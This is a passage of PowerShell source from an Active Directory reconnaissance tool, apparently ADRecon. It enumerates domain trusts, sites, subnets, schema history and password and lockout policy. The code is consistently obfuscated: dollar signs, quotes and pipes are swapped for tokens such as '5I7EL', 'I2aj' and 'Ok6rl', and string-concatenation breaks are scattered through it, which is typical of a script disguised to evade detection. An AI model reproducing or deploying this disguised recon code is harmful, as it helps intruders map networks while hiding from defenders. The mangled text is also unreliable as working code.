            If (5I7ELPrivilegedAccessManagement)
            {
                If (5I7ELPrivilegedAccessManagement.Properties.JQTOymsDS-EnabledFeatureBLJQTOy.Count -gt 0)
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajEnabledI2aj
              '+'      5I7ELForestObj += 5I7ELObj
                    For(5I7ELi=0; 5I7ELi -lt 5I7EL(5I7ELPrivilegedAccessManagement.Properties.JQTOymsDS-EnabledFeatureBLJQ'+'TOy.Count); 5I7ELi++)
                    {
                        5I7ELObj = New-Object PSObject
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajEnabled ScopeI2aj
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELPrivilegedAccessManagement.Properties.JQTOymsDS-EnabledFeatureBLJQTOy[5I7ELi]
                        5I7ELForestObj += 5I7ELObj
                    }
                }
                Else
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajDisabledI2aj
                    5I7ELForestObj += 5I7ELObj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajDisabledI2aj
                5I7ELForestObj += '+'5I7ELObj
            }

            Remove-Variable ADForest
        }
    }

    If (5I7ELForestObj)
    {
        Return 5I7ELForestObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRTrust
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain
    )

    
    5I7ELTDAD = @{
        0 = I2ajDisabledI2aj;
        1 = I2ajInboundI2aj;
        2 = I2ajOutboundI2aj;
        3 = I2ajBiDirectionalI2aj;
    }

    
    5I7ELTTAD = @{
        1 = I2ajDownlevelI2aj;
        2 = I2ajUplevelI2aj;
        3 = I2ajMITI2aj;
        4 = I2ajDCEI2aj;
    }

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADTrusts = Get-ADObject -LDAPFilter I2aj(objectClass=trustedDomain)I2aj -Properties DistinguishedName,trustPartner,trustdirection,trusttype,TrustAttributes,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRTrust] Error while enumerating trustedDomain ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADTrusts)
        {
            Write-Verbose I2aj[*] Total Trusts: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADTrusts))I2aj
            
            5I7ELADTrustObj = @()
            5I7ELADTrusts Ok6rl ForEach-Object {
                
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajSource DomainI2aj -Value (Get-DNtoFQDN 5I7EL_.DistinguishedName)
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajTarget DomainI2aj -Value 5I7EL_.trustPartner
                5I7ELTrustDirection = [string] 5I7ELTDAD[5I7EL_.trustdirection]
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajTrust DirectionI2aj -Value 5I7ELTrustDirection
                5I7ELTrustType = [string] 5I7ELTTAD[5I7EL_.trusttype]
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajTrust TypeI2aj -Value 5I7ELTrustType

                5I7ELTrustAttributes = 5I7ELnull
                If ([int32] 5I7EL_.TrustAttributes -band 0x00000001) { 5I7ELTrustAttributes += I2ajNon Transitive,I2aj }
                If ([int32] 5I7EL_.TrustAttributes -band 0x00000002) { 5I7ELTrustAttributes += I2ajUpLevel,I2aj }
                If ([int32] 5I7EL_.TrustAttributes -band 0x00000004) { 5I7ELTrustAttributes += I2ajQuarantin'+'ed,I2aj } 
                If ([int32] 5I7EL_.TrustAttributes -band 0x00000008) { 5I7ELTrustAttributes += I2ajForest Transitive,I2aj }
                If ([int32] 5I7EL_.TrustAttributes -band 0x00000010) { 5I7ELTrustAttributes += I2ajCross Organization,I2aj } 
                If ([int32] 5I7EL_.TrustAttributes -band 0x00000020) { 5I7ELTrustAttributes += I2ajWithin Forest,I2aj }
                If ([int32] 5I7EL_.TrustAttributes -band 0x00000040) { 5I7ELTrustAttributes += I2ajTreat as External,I2aj }
                If ([int32] 5I7EL_.TrustAttributes -band 0x00000080) { 5I7ELTrustAttributes += I2ajUses RC4 Encryption,I2aj }
                If ([int32] 5I7EL_.TrustAttributes -band 0x00000200) { 5I7ELTrustAttributes += I2ajNo TGT Delegation,I2aj }
                If ([int32] 5I7EL_.TrustAttributes -band 0x00000400) { 5I7ELTrustAttributes += I2ajPIM Trust,I2aj }
                If (5I7ELTrustAttributes)
                {
                    5I7ELTrustAttributes = 5I7ELTrustAttributes.TrimEnd(I2aj,I2aj)
                }
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajAttributesI2aj -Value 5I7ELTrustAttributes
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenCreatedI2aj -Value ([DateTime] 5I7EL(5I7EL_.whenCreated))
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenChangedI2aj -Value ([DateTime] 5I7EL(5I7EL_.whenChanged))
                5I7ELADTrustObj += 5I7ELObj
            }
            Remove-Variable ADTrusts
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(objectClass=trustedDomain)I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdistinguishednameI2aj,I2ajtrustpartnerI2aj,I2ajtrustdirectionI2aj,I2ajtrusttypeI2aj,I2ajtrustattributesI2aj,I2ajwhencreatedI2aj,I2ajwhenchangedI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADTrusts = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRTrust] Error while enumerating trustedDomain ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADTrusts)
        {
            Write-Verbose I2aj[*] Total Trusts: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADTrusts))I2aj
            
            5I7ELADTrustObj = @()
            5I7ELADTrusts Ok6rl ForEach-Object {
                
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajSource DomainI2aj -Value 5I7EL(Get-DNtoFQDN ([string] 5I7EL_.Properties.distinguishedname))
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajTarget DomainI2aj -Value 5I7EL([string] 5I7EL_.Properties.trustpartner)
                5I'+'7ELTrustDirection = [string] 5I7ELTDAD[5I7EL_.Properties.trustdirection]
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajTrust DirectionI2aj -Value 5I7ELTrustDirection
                5I7ELTrustType = [string] 5I7ELTTAD[5I7EL_.Properties.trusttype]
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajTrust TypeI2aj -Value 5I7ELTrustType

                5I7ELTrustAttributes = 5I7ELnull
                If ([int32] 5I7EL_.Properties.trustattributes[0] -band 0x00000001) { 5I7ELTrustAttributes += I2ajNon Transitive,I2aj }
                If ([int32] 5I7EL_.Properties.trustattributes[0] -band 0x00000002) { 5I7ELTrustAttributes += I2ajUpLevel,I2aj }
                If ([int32] 5I7EL_.Properties.trustattributes[0] -band 0x00000004) { 5I7ELTrustAttributes += I2ajQuarantined,I2aj } 
                If ([int32] 5I7EL_.Properties.trustattributes[0] -band 0x00000008) { 5I7ELTrustAttributes += I2ajForest Transitive,I2aj }
                If ([int32] 5I7EL_.Properties.trustattributes[0] -band 0x00000010) { 5I7ELTrustAttributes += I2ajCross Organization,I2aj } 
                If ([int32] 5I7EL_.Properties.trustattributes[0] -band 0x00000020) { 5I7ELTrustAttributes += I2ajWithin Forest,I2aj }
                If ([int32] 5I7EL_.Properties.trustattributes[0] -band 0x00000040) { 5I7ELTrustAttributes += I2ajTreat as External,I2aj }
                If ([int32] 5I7EL_.Properties.trustattributes[0] -band 0x00000080) { 5I7ELTrustAttributes += I2ajUses RC4 Encryption,I2aj }
                If ([int32] 5I7EL_.Properties.trustattributes[0] -band 0x00000200) { 5I7ELTrustAttributes += I2ajNo TGT Delegation,I2aj }
                If ([int32] 5I7EL_.Properties.trustattributes[0] -band 0x00000400) { 5I7ELTrustAttributes += I2ajPIM Trust,I2aj }
                If (5I7ELTrustAttributes)
                {
                    5I7ELTrustAttributes = 5I7ELTrustAttributes.TrimEnd(I2aj,I2aj)
                }
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajAttributesI2aj -Value 5I7ELTrustAttributes
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenCreatedI2aj -Value ([DateTime] 5I7EL(5I7EL_.Properties.whencreated))
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenChangedI2aj -Value ([DateTime]'+' 5I7EL(5I7EL_.Properties.whenchanged))
                5I7ELADTrustObj += 5I7ELObj
            }
            Remove-Variable ADTrusts
        }
    }

    If (5I7ELADTrustObj)
    {
        Return 5I7ELADTrustObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRSite
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomainRootDSE,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELDomainController,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELSearchPath = I2ajCN=SitesI2aj
            5I7ELADSites = Get-ADObject -SearchBase I2aj5I7ELSearchPath,5I7EL((Get-ADRootDSE).configurationNamingContext)I2aj -LDAPFilter I2aj(objectClass=site)I2aj -Properties Name,Description,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRSite] Error while enumerating Site ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADSites)
        {
            Write-Verbose I2aj[*] Total Sites: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADSites))I2aj
            
            5I7ELADSiteObj = @()
            5I7ELADSites Ok6rl ForEach-Object {
                
                5I7ELObj = New-Object PSObject
             '+'   5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajNameI2aj -Value 5I7EL_.Name
                5I7ELObj Ok6rl Add-'+'Member -MemberType NoteProperty -Name I2ajDescriptionI2aj -Value 5I7EL_.Description
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenCreatedI2aj -Value 5I7EL_.whenCreated
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenChangedI2aj -Value 5I7EL_.whenChanged
                5I7ELADSiteObj += 5I7ELObj
            }
            Remove-Variable ADSites
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELSearchPath = I2ajCN=SitesI2aj
        If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7ELSearchPath,5I7EL(5I7ELobjDomainRootDSE.ConfigurationNamingContext)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
        }
        Else
        {
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7ELSearchPath,5I7EL(5I7ELobjDomainRootDSE.ConfigurationNamingContext)I2aj
        }
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
        5I7ELObjSearcher.Filter = I2aj(objectClass=site)I2aj
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try'+'
        {
            5I7ELADSites = 5I7ELObjSearcher.FindAll()
        }
        Catch
       '+' {
            Write-Warning I2aj[Get-ADRSite] Error while enumerating Site ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADSites)
        {
            Write-Verbose I2aj[*] Total Sites: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADSites))I2aj
            
            5I7ELADSiteObj = @()
            5I7ELADSites Ok6rl ForEach-Object {
                
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajNameI2aj -Value 5I7EL([string] 5I7EL_.Propertie'+'s.name)
                5I7ELObj'+' Ok6rl Add-Member -MemberType NoteProperty -Name I2ajDescriptionI2aj -Value 5I7EL([string] 5I7EL_.Properties.description)
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2a'+'jwhenCreatedI2aj -Value ([DateTime] 5I7EL(5I7EL_.Properties.whencreated))
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenChangedI2aj -Value ([DateTime] 5I7EL(5I7EL_.Properties.whenchanged))
                5I7ELADSiteObj += 5I7ELObj
            }
            Remove-Variable ADSites
        }
    }

    If (5I7ELADSiteObj)
    {
        Return 5I7ELADSiteObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRSubnet
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomainRootDSE,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELDomainController,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELSearchPath = I2ajCN=Subnets,CN=SitesI2aj
            5I7ELADSubnets = Get-ADObject -SearchBase I2aj5I7ELSearchPath,5I7EL((Get-ADRootDSE).configurationNamingContext)I2aj -LDAPFilter I2aj(objectClass=subnet)I2aj -Properties Name,Description,siteObject,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRSubnet] Error while enumerating Subnet ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADSubnets)
        {
            Write-Verbose I2aj[*] Total Subnets: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADSubnets))I2aj
            
            5I7ELADSubnetObj = @()
            5I7ELAD'+'Subnets Ok6rl ForEach-Object {
                
                5I7ELObj = New-Object PSObject
                5I7ELObj '+'Ok6rl Add-Member -MemberType NoteProperty -Name I2ajSiteI2aj -Value 5I7EL((5I7EL_.siteObject -Split I2aj,I2aj)[0] -replace JQTOyCN=JQTOy,JQTOyJQTOy)
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajNameI2aj -Value 5I7EL_.Name
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajDescriptionI2aj'+' -Value 5I7EL_.Description
                5I7'+'ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenCreatedI2aj -Value 5I7EL_.whenCreated
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenChangedI2aj -Value 5I7EL_.whenChanged
                5I7ELADSubnetObj += 5I7ELObj
            }
            Remove-Variable ADSubnets
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELSearchPath = I2ajCN=Subnets,CN=SitesI2aj
        If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7ELSearchPath,5I7EL(5I7ELobjDomainRootDSE.ConfigurationNamingContext)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
        }
        Else
        {
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7ELSearchPath,5I7EL(5I7ELobjDomainRootDSE.ConfigurationNamingContext)I2aj
        }
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
        5I7ELObjSearcher.Filter = I2aj(objectClass=subnet)I2aj
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELADSubnets = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRSubnet] Error while enumerating Subnet ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADSubnets)
        {
            Write-Verbose I2aj[*] Total Subnets: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADSubnets))I2aj
            
            5I7ELADSubnetObj = @('+')
            5I7ELADSubnets Ok6rl ForEach-Object {
                
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajSiteI2aj -Value 5I7EL((([string] 5I7EL_.Properties.siteobject) -Split I2aj,I2aj)[0] -replace JQTOyCN=JQTOy,JQTOyJQTOy)
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajNameI2aj -Value 5I7EL([string] 5I7EL_.Properties.name)
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajDescriptionI2aj -Value 5I7EL([string] 5I7EL_.Properties.description)
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenCreatedI2aj -Value ([DateTime] 5I7EL(5I7EL_.Properties.whencreated))
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajwhenChangedI2aj -Value ([DateTime] 5I7EL(5I7EL_.Properties.whenchanged))
                5I7ELADSubnetObj += 5I7ELObj
            }
            Remove-Variable ADSubnets
        }
    }

    If (5I7ELADSubnetObj)
    {
        Return 5I7ELADSubnetObj
    }
    Else
    {
        Return 5I7ELnull
    }
}


Function Get-ADRSchemaHistory
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomainRootDSE,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELDomainController,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADSchemaHistory = @( Get-ADObject -SearchBase ((Get-ADRootDSE).schemaNamingContext) -SearchScope OneLevel -Filter * -Property DistinguishedName, Name, ObjectClass, whenChanged, whenCreated )
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRSchemaHis'+'tory] Error while enumerating Schema ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADSchemaHistory)
        {
            Write-Verbose I2aj[*] Total Schema Objects: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADSchemaHistory))I2aj
            5I7ELADSchemaObj = [ADRecon.ADWSClass]::SchemaParser(5I7ELADSchemaHistory, 5I7ELThreads)
            Remove-Variable ADSchemaHistory
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        If (5I'+'7ELCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7EL(5I7ELobjDomainRootDSE.schemaNamingContext)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
        }
        Else
        {
            5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELobjDomainRootDSE.schemaNamingContext)I2aj
        }
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7EL'+'objSearchPath
        5I7ELObjSearcher.Filter = I2aj(objectClass=*)I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdistinguishednameI2aj,I2ajnameI2aj,I2ajobjectclassI2aj,I2ajwhenchangedI2aj,I2ajwhencreatedI2aj))
        5I7ELObjSearcher.SearchScope = I2ajOneLevelI2aj

        Try
        {
            5I7ELADSchemaHistory = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRSchemaHistory] Error while enumerating Schema ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADSchemaHistory)
        {
            Write-Verbose I2aj[*] Total Schema Objects: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADSchemaHistory))I2aj
            5I7ELADSchemaObj = [ADRecon.LDAPClass]::SchemaParser(5I7ELADSchemaHistory, 5I7ELThreads)
            Remove-Variable ADSchemaHistory
        }
    }

    If (5I7ELADSchemaObj)
    {
        Return 5I7ELADSchemaObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRDefaultPasswordPolicy
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADpasspolicy = Get-ADDefaultDomainPasswordPolicy
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRDefaultPasswordPolicy] Error while enumerating the Default Password PolicyI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADpasspolicy)
        {
            5I7ELObjValues = @( I2ajEnforce password history (passwords)I2aj, 5I7ELADpasspolicy.PasswordHistoryCount, I2aj4I2aj, I2ajReq. 8.2.5I2aj, I2aj8I2aj, I2ajControl: 0423I2aj, I2aj24 or moreI2aj,
            I2ajMaximum password age (days)I2aj, 5I7ELADpasspolicy.MaxPasswordAge.days, I2aj90I2aj, I2ajReq. 8.2.4I2aj, I2aj90I2aj, I2ajControl: 0423I2aj, I2aj1 to 60I2aj,
            I2ajMinimum password age (days)I2aj, 5I7ELADpasspolicy.MinPasswordAge.days, I2ajN/AI2aj, I2aj-I2aj, I2aj1I2aj, I2ajControl: 0423I2aj, I2aj1 or moreI2aj,
            I2ajMinimum password length (characters)I2aj, 5I7ELADpasspolicy.MinPasswordLength, I2aj7I2aj, I2ajReq. 8.2.3I2aj, I2aj13I2aj, I2ajControl: 0421I2aj, I2aj14 or moreI2aj,
            I2ajPassword must meet complexity requirementsI2aj, 5I7ELADpasspolicy.ComplexityEnabled, 5I7ELtrue, I2ajReq. 8.2.3I2aj, 5I7ELtrue, I2ajControl: 0421I2aj, 5I7ELtrue,
            I2ajStore password using reversible encryption for all users in the domainI2aj, 5I7ELADpasspolicy.ReversibleEncryptionEnabled, I2ajN/AI2aj, I2aj-I2aj, I2ajN/AI2aj, I2aj-I2aj, 5I7ELfalse,
            I2ajAccount lockout duration (mins)I2aj, 5I7ELADpasspolicy.LockoutDuration.minutes, I2aj0 (manual unlock) or 30I2aj, I2ajReq. 8.1.7I2aj,'+' I2ajN/AI2aj, I2aj-I2aj, I2aj15 or moreI2aj,
            I2ajAccount lockout threshold (attempts)I2aj, 5I7ELADpasspolicy.LockoutThreshold, I2aj1 to 6I2aj, I2ajReq. 8.1.6I2aj, I2aj1 to 5I2aj, I2ajControl: 1403I2aj, I2aj1 to 10I2aj,
            I2ajReset account lockout counter after (mins)I2aj, 5I7ELADpasspolicy.LockoutObservationWindow.minutes, I2ajN/AI2aj, I2aj-I2aj, I2ajN/AI2aj, I2aj-I2aj, I2aj15 or moreI2aj )

            Remove-Variable ADpasspolicy
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
    '+'    If (5I7ELObjDomain)
        {
            
            5I7ELpwdProperties = @{
                I2ajDOMAIN_PASSWORD_COMPLEXI2aj = 1;
                I2ajDOMAIN_PASSWORD_NO_ANON_CHANGEI2aj = 2;
                I2ajDOMAIN_PASSWORD_NO_CLEAR_CHANGEI2aj = 4;
                I2ajDOMAIN_LOCKOUT_ADMINSI2aj = 8;
                I2ajDOMAIN_PASSWORD_STORE_CLEARTEXTI2aj = 16;
                I2ajDOMAIN_REFUSE_PASSWORD_CHANGEI2aj = 32
            }

            If ((5I7ELObjDomain.pwdproperties.value -band 5I7ELpwdProperties[I2ajDOMAIN_PASSWORD_COMPLEXI2aj]) -eq 5I7ELpwdProperties[I2ajDOMAIN_PASSWORD_COMPLEXI2aj])
            {
                5I7ELComplexPasswords = 5I7ELtrue
            }
            Else
            {
                5I7ELComplexPasswords = 5I7ELfalse
            }

            If ((5I7ELObjDomain.pwdproperties.value -band 5I7ELpwdProperties[I2ajDOMAIN_PASSWORD_STORE_CLEARTEXTI2aj]) -eq 5I7ELpwdProperties[I2ajDOMAIN_PASSWORD_STORE_CLEARTEXTI2aj])
            {
                5I7ELReversibleEncryption = 5I7ELtrue
            }
            Else
            {
                5I7ELReversibleEncryption = 5I7ELfalse
            }

            5I7ELLockoutDuration = 5I7EL(5I7ELObjDomain.ConvertLargeIntegerToInt64(5I7ELObjDomain.lockoutduration.value)/-600000000)

            If (5I7ELLockoutDuration -gt 99999)
            {
                5I7ELLockoutDuration = 0
            }

            5I7ELObjValues = @( I2ajEnforce password history (passwords)I2aj, 5I7ELObjDomain.PwdHistoryLength.value, I2aj4I2aj, I2ajReq. 8.2.5I2aj, I2aj8I2aj, I2ajControl: 0423I2aj, I2aj24 or moreI2aj,
            I2ajMaximum password age (days)I2aj, 5I7EL(5I7ELObjDomain.ConvertLargeIntegerToInt64(5I7ELObjDomain.maxpwdage.value) /-864000000000), I2aj90I2aj, I2ajReq. 8.2.4I2aj, I2aj90I2aj, I2ajControl: 0423I2aj, I2aj1 to 60I2aj,
            I2ajMinimum password age (days)I2aj, 5I7EL(5I7ELObjDomain.ConvertLargeIntegerToInt64(5I7ELObjDomain.minpwdage.value) /-864000000000), I2ajN/AI2aj, I2aj-I2aj, I2aj1I2aj, I2ajControl: 0423I2aj, I2aj1 or moreI2aj,
            I2ajMinimum password length (characters)I2aj, 5I7ELObjDomain.MinPwdLength.value, I2aj7I2aj, I2ajReq. 8.2.3I2aj, I2aj13I2aj, I2ajControl: 0421I2aj, I2aj14 or moreI2aj,
            I2ajPassword must meet complexity requirementsI2aj, 5I7ELComplexPasswords, 5I7ELtrue, I2ajReq. 8.2.3I2aj, 5I7ELtrue, I2ajControl: 0421I2aj, 5I7ELtrue,
            I2ajStore password using reversible encryption for all users in the domainI2aj, 5I7ELReversibleEncryption, I2ajN/AI2aj, I2aj-I2aj, I2ajN/AI2aj, I2aj-I2aj, 5I7ELfalse,
            I2ajAccount lockout duration (mins)I2aj, 5I7ELLockoutDuration, I2aj0 (manual unlock) or 30I2aj, I2ajReq. 8.1.7I2aj, I2ajN/AI2aj, I2aj-I2aj, I2aj15 or moreI2aj,
            I2ajAccount lockout threshold (attempts)I2aj, 5I7ELObjDomain.LockoutThreshold.value, I2aj1 to 6I2aj, I2ajReq. 8.1.6I2aj, I2aj1 to 5I2aj, I2ajControl: 1403I2aj, I2aj1 to 10I2aj,
            I2ajReset account lockout counter after (mins)I2aj, 5I7EL(5I7ELObjDomain.ConvertLargeIntegerToInt64(5I7ELObjDomain.lockoutobservationWindow.value)/-600000000), I2ajN/AI2aj, I2aj-I2aj, I2ajN/AI2aj, I2aj-I2aj, I2aj15 or moreI2aj )

            Remove-Variable pwdProperties
            Remove-Variable ComplexPasswords
            Remove-Variable ReversibleEncryption
        }
    }

    If (5I7ELObjValues)
    {
        5I7ELADPassPolObj = @()
        For (5I7ELi = 0; 5I7ELi -lt 5I7EL(5I7ELObjValues.Count); 5I7ELi++)
        {
            5I7ELObj = New-Object PSObject
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajPolicyI2aj -Value 5I7ELObjValues[5I7ELi]
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCurrent ValueI2aj -Value 5I7ELObjValues[5I7ELi+1]
